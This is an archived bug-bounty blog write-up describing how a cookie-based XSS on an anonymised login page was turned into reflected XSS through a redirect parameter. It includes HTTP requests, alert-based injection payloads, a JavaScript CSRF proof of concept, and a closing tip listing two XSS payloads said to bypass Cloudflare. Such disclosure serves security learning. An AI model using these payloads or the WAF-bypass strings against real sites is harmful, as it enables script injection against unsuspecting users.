---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-08-23_cookie-worth-a-fortune.md
original_filename: 2019-08-23_cookie-worth-a-fortune.md
title: Cookie worth a fortune
category: documents
detected_topics:
- xss
- command-injection
- csrf
- api-security
tags:
- imported
- documents
- xss
- command-injection
- csrf
- api-security
language: en
raw_sha256: e1effb6001f0d8b86a8d0f4c88a08daec68385e72003d1cef887d2afa68f13c3
text_sha256: 267a77bbc2dbd9281fe4cfdd861579dfae33c8af2626dee4e3dd3ddfbaa80292
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# Cookie worth a fortune

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-08-23_cookie-worth-a-fortune.md
- Source Type: markdown
- Detected Topics: xss, command-injection, csrf, api-security
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `e1effb6001f0d8b86a8d0f4c88a08daec68385e72003d1cef887d2afa68f13c3`
- Text SHA256: `267a77bbc2dbd9281fe4cfdd861579dfae33c8af2626dee4e3dd3ddfbaa80292`


## Content

---
title: "Cookie worth a fortune"
page_title: "Cookie worth a fortune | I'm Gaurav Narwani"
url: "https://gauravnarwani.com/cookie-worth-a-fortune/"
final_url: "https://gauravnarwani.com/cookie-worth-a-fortune/"
authors: ["Gaurav Narwani (@gauravnarwani97)"]
bugs: ["Reflected XSS"]
publication_date: "2019-08-23"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5066
---

[ ![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/08/gg1.jpg?fit=1000%2C709&ssl=1) ](https://gauravnarwani.com/cookie-worth-a-fortune/)

# Cookie worth a fortune

[admin](https://gauravnarwani.com/author/admin/ "Posts by admin") / [August 23, 2019](https://gauravnarwani.com/cookie-worth-a-fortune/)

In the following post, a Cookie Based Cross-Site-Scripting vulnerability was converted into a Reflected Cross-Site-Scripting vulnerability. A cookie-based XSS is generally considered Out Of Scope because an attacker has to physically insert the malicious cookie, which is very less likely. To exploit this to become a valid vulnerability, a way had to be found such that the cookie is inserted into the page and hence fire the payload. If you are new to Cross-Site-Scripting, read this [blog](https://gauravnarwani.com/a-tale-of-3-xss/). The vulnerability is described in the below case study after which there is a **Bug Bounty Tip**. These tips are generally picked from Twitter by the **#bugbountytip** in search. Any interesting tip found would surely be added on the blogs. Please don’t forget to read the **Bug Bounty Tip** at the end of each post and also like, share and subscribe to the Blog.

## Case Study: Cookie Based XSS to Reflected XSS

### Finding Cookie Based XSS

The application under test was a three-tier web application – Presentation tier (Front-End/User Interface), Application Tier (Functional Logic) and Data-Tier (Databases). As this was a private program all illustrations of vulnerabilities will be represented with the host as **example.com**.

The application has a**login** page where users can use the credentials provided to sign-in the application using provided credentials.

If any user is on a page xyz and he clicks on logout, the application redirected to the login page with the URL:  
https://example.com/login?redirect=%2Fxyz

The first thing tested in this case was to see if the parameter can be manipulated to **javascript:alert(document.domain)** to fire the XSS payload through redirection. The POST request was sent with the credentials in the data. The application ignored the payload and redirected to /home.
  
  
  **URL sent (POST):** https://example.com/login?redirect=javascript:alert(document.domain)  
  **Response:** https://example.com/home

The parameter **redirect** on the login page was then tested for reflected XSS. As per a general procedure, a value is inserted into the parameter and is checked whether the value reflects in the response
  
  
  **Request sent (GET):** https://example.com/login?redirect=hello  
  **Response:** No reflecting value, **redirected** to https://example.com/login?redirect=/hello

After this attempt, the source code was analysed. The https://example.com/login page was refreshed and the GET request was sent to the repeater. The request was then submitted to view the source code of the page.  
While analysing the source code, it was seen that the value submitted in the parameter **redirect** in the previous URL was now reflected in the source code. This was strange as the request was made to the login page without any redirect parameter value.  
On analysing, it was observed that the redirect parameter stores the value of the redirection page inside the cookie redirectTo.
  
  
  **Request:**
  GET /login HTTP/1.1
  Host: example.com
  Cookie: redirectTo=/hello;
  
  **Response:**
  HTTP/1.1 200 OK
  …
  …
  <script>
  …
            redirect = '/hello’;
            if (redirect === null || redirect === 'null') {
              redirect = undefined; }
  ...
  </script>

Now to get a Cross-Site Scripting, the payload was modified as to insert an alert box in between the script tags. The following payload was formed.
  
  
  **Payload:** asd ';alert(document.domain)//asd
  **Request:**
  GET /login HTTP/1.1
  Host: example.com
  Cookie: redirectTo=/asd ';alert(document.domain)//asd;
   
  **Response:**
  <script>
  …
  Redirect='/asd';alert(document.domain)//asd’;
  …
  </script>

The response from burp was rendered in the browser where the alert box fired.

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/03/xss-popup.png?fit=322%2C204&ssl=1)

### Converting Cookie-Based XSS to Reflected XSS

The main issue now was to convert this cookie-based XSS to reflected XSS. The most important thing here was that the redirect parameter was under control.

It was observed that the redirectTo cookie set the value of itself to the value of redirect paramter in the URL.  
**Flow: example.com/login?redirect=hello — > example.com/login (Cookie: redirectTo=/hello)**

All we needed to do now was to set the cookie to the payload via the redirect parameter in the URL.  
By just setting the payload in the redirect parameter, the payload didn’t fire directly. This is because the application had mechanisms as such:

**Redirect parameter in UR** L: Script written as such to redirect to the specified path after login  
**No redirect parameter in URL** : Script written as such to redirect to path in cookie

Now all we needed to do was to remove the parameter from the URL such that the application takes the value from cookie and executes out payload.
  
  
  **Request1** : https://example.com/login/?redirect= asd ';alert(document.domain)//asd  
  **Response:** Payload doesn’t fire as we have specified a redirection value in URL  
  
  **Request2**(Resend the Request 1 without redirect parameter): https://example.com/login  
  **Response:** Payload fires because it takes the redirect value from the cookie.

Hence to now convert the cookie-based XSS to reflected XSS, two requests had to be sent sequentially:

  1. **Set the cookie** via redirect parameter.
  2. **Open the login pag** e again **without** the redirect parameter.

To do this in one click, a **CSRF POC** was generated as follows:
  
  
  <script>  
  function exploit() {  
  setTimeout(function() {  
  var s1 = new XMLHttpRequest(); // first request is necessary for exploitation  
  s1.open('GET', ' https://example.com/login/', true);  
  s1.send(null);  
  document.location.href='https://example.com/login/'; // now redirecting to page  
  }, 1000);  
  }  
  </script>  
  <body onload="exploit()">  
  <script>  
  var xmlhttp = new XMLHttpRequest();  
  xmlhttp.open('GET', ' https://example.com/login/?redirect=asd ';alert(document.domain)//asd’, false);  
  xmlhttp.send(null);  
  </script>

The above code does the following things: First, it send a **GET** request to https://example.com/login/?redirect=asd ‘;alert(document.domain)//asd which **sets the redirectTo cookie** to the payload  to /asd’;alert(document.domain)//asd.

Then, after a specific period of time, it sends another **GET** request to https://example.com/login with the **payload in the cookie** , which **fires the payload** converting it to a **reflected XSS.**

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/03/xss-popup.png?fit=322%2C204&ssl=1)

Thus, a cookie-based XSS was converted into a reflected XSS. This bug is accepted by Synack and is still in triage phase.

That’s all for this Blog. Hope you liked it.

**#BugBountyTip:**  
“Cloudflare”; live payloads:  
~1: <img longdesc=”src=’x’onerror=alert(document.domain);//><img ” src=’showme’>  
~2: <img longdesc=”src=” images=”” stop.png”=”” onerror=”alert(document.domain);//&quot;” src=”x” alt=”showme”>

Credits to [@spyerror](https://twitter.com/spyerror) for this tip

That’s all for today. Please subscribe to my [blog](https://gauravnarwani.com/blog). Connect with me on [LinkedIn](https://linkedin.com/in/gauravnarwani97).

## Gaurav Narwani

[![Buy me a coffee](https://bmc-cdn.nyc3.digitaloceanspaces.com/BMC-button-images/BMC-btn-logo.svg)Buy me a coffee](https://www.buymeacoffee.com/7JOe3dMcv)

### Share this:

  * [Twitter](https://gauravnarwani.com/cookie-worth-a-fortune/?share=twitter "Click to share on Twitter")
  * [Facebook](https://gauravnarwani.com/cookie-worth-a-fortune/?share=facebook "Click to share on Facebook")
  * [LinkedIn](https://gauravnarwani.com/cookie-worth-a-fortune/?share=linkedin "Click to share on LinkedIn")
  * [WhatsApp](https://gauravnarwani.com/cookie-worth-a-fortune/?share=jetpack-whatsapp "Click to share on WhatsApp")
  * [Telegram](https://gauravnarwani.com/cookie-worth-a-fortune/?share=telegram "Click to share on Telegram")
  * [Print](https://gauravnarwani.com/cookie-worth-a-fortune/#print "Click to print")
  * 

### Like this:

Like Loading...

Posted in: [Bug Bounty](https://gauravnarwani.com/category/bugb/)
